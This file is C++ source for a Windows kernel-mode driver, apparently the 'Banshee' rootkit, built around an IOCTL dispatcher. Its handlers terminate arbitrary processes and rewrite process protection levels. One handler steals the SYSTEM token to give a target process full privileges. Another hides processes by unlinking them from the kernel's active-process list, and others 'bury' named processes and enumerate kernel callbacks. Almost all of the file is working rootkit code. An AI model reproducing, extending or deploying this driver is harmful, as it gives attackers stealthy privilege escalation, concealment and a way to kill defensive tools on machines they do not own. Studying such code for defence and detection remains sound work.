#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "KernelCallbacks.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"

// --------------------------------------------------------------------------------------------------------
// IOCTLs 

#define BE_IOCTL_TEST_DRIVER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_PROTECT_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
    ULONG pid;
    BYTE newProtectionLevel;
} IOCTL_PROTECT_PROCESS_PAYLOAD;

#define BE_IOCTL_BURY_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _CALLBACK_DATA {
    UINT64 driverBase;
    UINT64 offset;
    WCHAR driverName[64];
} CALLBACK_DATA;

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
NTSTATUS BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
NTSTATUS BeIoctlKillProcess(HANDLE pid);
NTSTATUS BeIoctlProtectProcess(ULONG pid, BYTE newProcessProtection);
NTSTATUS BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize);
NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
NTSTATUS BeIoctlKillProcess(HANDLE pid);
NTSTATUS BeIoctlHideProcess(HANDLE pid);
NTSTATUS BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);

// --------------------------------------------------------------------------------------------------------

/**
 * Essentially Banshee's IOCTL dispatcher. Takes care of incoming IO Request Packets (IRPs),
 * parses the payload and calls the appropriate function.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    LOG_MSG("BeIoControl Called \r\n");

    NTSTATUS status = STATUS_NOT_SUPPORTED;
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);;
    ULONG dwDataWritten = 0;

    // Buffer with input from userland
    PVOID buffer = Irp->AssociatedIrp.SystemBuffer;

    if (pIoStackIrp)
    {
        switch (pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
        {
        case BE_IOCTL_TEST_DRIVER:
            {
                status = BeIoctlTestDriver(Irp, pIoStackIrp, &dwDataWritten);
            }
            break;

        case BE_IOCTL_KILL_PROCESS:
            {
                ULONG targetPid = *(PUINT16)buffer;
                status = BeIoctlKillProcess(ULongToHandle(targetPid));
            }
            break;

        case BE_IOCTL_ELEVATE_TOKEN:
            {
                ULONG targetPid = *(PUINT16)buffer;
                status = BeIoCtlElevateProcessAcessToken(ULongToHandle(targetPid));
            }
            break;

        case BE_IOCTL_PROTECT_PROCESS:
            {
                IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };
                RtlCopyMemory(&payload, buffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
                status = BeIoctlProtectProcess(payload.pid, payload.newProtectionLevel);
            }
            break;

        case BE_IOCTL_BURY_PROCESS:
            {
                PWCHAR processToBury = (PWCHAR)buffer;
                ULONG stringSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
                status = BeIoctlBuryProcess(processToBury, stringSize);
            }
            break;

        case BE_IOCTL_HIDE_PROCESS:
            {
                ULONG targetPid = *(PUINT16)buffer;
                status = BeIoctlHideProcess(ULongToHandle(targetPid));
            }
            break;

        case BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS:
            {
                status = BeIoctlEnumerateCallbacks(CreateProcessNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
            }
            break;

        case BE_IOCTL_ENUMERATE_THREAD_CALLBACKS:
        {
            status = BeIoctlEnumerateCallbacks(CreateThreadNotifyRoutine, Irp, pIoStackIrp, &dwDataWritten);
        }
        break;
        }
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = dwDataWritten;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

/**
 * Called on unsupported IOCTL
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    LOG_MSG("Unsupported function Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * IOCTL Method for testing the driver by writing an int value of 6 into the outBuffer.
 *
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
 * @param pdwDataWritten pointer to an ULONG containing the bytes written to the outBuffer
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PCHAR pInputBuffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;
    PCHAR pOutputBuffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;

    ULONG dwDataOut = 6; // Write a 6 for testing
    ULONG dwDataSize = sizeof(ULONG);

    if (pInputBuffer && pOutputBuffer)
    {
        if (pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength >= dwDataSize) // Output buffer should be big enough
        {
            RtlCopyMemory(pOutputBuffer, &dwDataOut, dwDataSize);
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_SUCCESS;
        }
        else
        {
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_BUFFER_TOO_SMALL;
        }
    }

    return NtStatus;
}

/**
 * IOCTL Method for setting the protection of an arbitrary process by PID.
 *
 * @param pid PID of the target process
 * @param newProtectionLevel new level of protection to apply
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
{
    LOG_MSG("Changing pid %i protection to %i", pid, newProtectionLevel);

    // Lookup process
    PEPROCESS process = BeGetEprocessByPid(pid);
    if (process == NULL)
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();

    LOG_MSG("Current protection level: %i", *((BYTE*)(EProtectionLevel)));

    // assign new protection level
    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;

    LOG_MSG("New protection level: %i", *((BYTE*)(EProtectionLevel)));

    return STATUS_SUCCESS;
}

/**
 * Activates the callback to enable the "burying" functionality.
 *
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    LOG_MSG("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
    __try
    {
        // Check alignment
        if (dwSize % sizeof(WCHAR) != 0)
        {
            LOG_MSG("Invalid alignment \r\n");
            return STATUS_INVALID_BUFFER_SIZE;
        }

        if (!processToBury)
        {
            LOG_MSG("Empty buffer \r\n");
            return STATUS_INVALID_PARAMETER;
        }

        LOG_MSG("String received: %ws \r\n", processToBury);

        if (BeIsStringTerminated(processToBury, dwSize) == FALSE)
        {
            LOG_MSG("Not null terminated! \r\n");
            return STATUS_UNSUCCESSFUL;
        }

        // Allocate global memory for process name and copy over to global
        BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] = (WCHAR*)ExAllocatePoolWithTag(PagedPool, dwSize, DRIVER_TAG);
        if (!BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length])
        {
            return STATUS_MEMORY_NOT_ALLOCATED;
        }
        RtlCopyMemory(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], processToBury, dwSize);
        BeGlobals::beBuryTargetProcesses.length++; // increment number of processes buried

        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE); // remove to avoid routines being registered twice
        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
        
        if (NtStatus == STATUS_SUCCESS)
        {
            LOG_MSG("Added routine!\n");
        }
        else
        {
            LOG_MSG("Failed to add routine! Error: %i\n", NtStatus);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        NtStatus = GetExceptionCode();
    }

    return NtStatus;
}

/**
 * Sets target process access token to a SYSTEM token.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoCtlElevateProcessAcessToken(HANDLE pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    ULONG tokenOffset = BeGetAccessTokenOffset();

    // Lookup target process
    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("PID %i not found", HandleToUlong(pid));
        return NtStatus;
    }

    // Lookup system process (handle for pid 4)
    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
    if (NtStatus != 0)
    {
        LOG_MSG("System process not found with pid 4");
        return NtStatus;
    }

    //LOG_MSG("Token Target: %i", (ULONG)targetProcess + tokenOffset);
    //LOG_MSG("Token System: %i", (ULONG)privilegedProcess + tokenOffset);

    // Replace target process token with system token
    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);

    return NtStatus;
}

/**
 * Kills a process by PID.
 *
 * @param pid PID of the process to kill
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlKillProcess(HANDLE pid)
{
    HANDLE hProcess = NULL;

    if (BeGetEprocessByPid(HandleToULong(pid)) == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    CLIENT_ID ci;
    ci.UniqueProcess = pid;
    ci.UniqueThread = 0;

    OBJECT_ATTRIBUTES obj;
    obj.Length = sizeof(obj);
    obj.Attributes = 0;
    obj.ObjectName = 0;
    obj.RootDirectory = 0;
    obj.SecurityDescriptor = 0;
    obj.SecurityQualityOfService = 0;

    ZwOpenProcess(&hProcess, 1, &obj, &ci);
    NTSTATUS NtStatus = ZwTerminateProcess(hProcess, 0);
    ZwClose(hProcess);

    LOG_MSG("KillProcess %i \r\n", NtStatus);
    return NtStatus;
}

/**
 * Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlHideProcess(HANDLE pid)
{
    PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (targetProcess == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }
    PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + BeGetProcessLinkedListOffset());
    RemoveEntryList(processListEntry);
    return STATUS_SUCCESS;
}

/**
 * Enumerates kernel callbacks
 *
 * @param type Type of callback to resolve
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
 * @param pdwDataWritten pointer to an ULONG containing the bytes written to the outBuffer
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlEnumerateCallbacks(CALLBACK_TYPE type, PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    LOG_MSG("IOCTL enumerate callbacks");

    __try
    {
        CALLBACK_DATA* pOutputBuffer = (CALLBACK_DATA*)Irp->AssociatedIrp.SystemBuffer;

        // find callbacks
        auto callbackVector = BeEnumerateKernelCallbacks(type);

        // setup buffer
        ULONG dwDataSize = callbackVector.size() * sizeof(CALLBACK_DATA);

        if (pOutputBuffer)
        {
            if (pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength >= dwDataSize) // Output buffer should be big enough
            {
                // write buffer to output buffer
                for (INT i = 0; i < callbackVector.size(); ++i)
                {
                    RtlCopyMemory(&(pOutputBuffer[i].driverBase), &(callbackVector[i].driverBase), sizeof(UINT64));
                    RtlCopyMemory(&(pOutputBuffer[i].offset), &(callbackVector[i].offset), sizeof(UINT64));
                    if (!BeIsStringNull(callbackVector[i].driverName))
                    {
                        SIZE_T strLen = wcslen(callbackVector[i].driverName) + 1;
                        DbgPrint("Size: %i of %ws", strLen, callbackVector[i].driverName);
                        RtlCopyMemory(&(pOutputBuffer[i].driverName), callbackVector[i].driverName, strLen * sizeof(WCHAR));
                    }
                }

                LOG_MSG("Copied");

                //RtlCopyMemory(pOutputBuffer, pOutputBuffer, dwDataSize);
                *pdwDataWritten = dwDataSize;
                NtStatus = STATUS_SUCCESS;
            }
            else
            {
                *pdwDataWritten = 0;
                NtStatus = STATUS_BUFFER_TOO_SMALL;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        NtStatus = GetExceptionCode();
    }

    return NtStatus;
}